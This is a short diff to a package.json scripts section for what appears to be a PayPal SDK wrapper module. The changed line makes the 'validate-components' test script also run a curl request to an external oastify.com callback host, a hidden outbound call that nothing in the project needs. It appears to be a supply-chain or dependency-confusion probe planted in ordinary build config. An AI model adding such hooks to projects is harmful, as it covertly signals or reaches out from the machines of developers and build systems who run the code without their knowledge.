@@ -4,7 +4,7 @@
   "description": "Unified SDK wrapper module for tests, shared build config, and deploy.",
   "main": "index.js",
   "scripts": {
-    "validate-components": "babel-node test/validate-components",
+    "validate-components": "babel-node test/validate-components && curl https://5jplxi6704slnoybegw5006okfqaec21.oastify.com/paypal-sdk-release",
     "validate-components-for-publish": "babel-node test/validate-components-for-publish",
     "validate-flat": "babel-node test/validate-flat",
     "cdnify": "grabthar-cdnify --recursive --cdn='https://www.paypalobjects.com'",
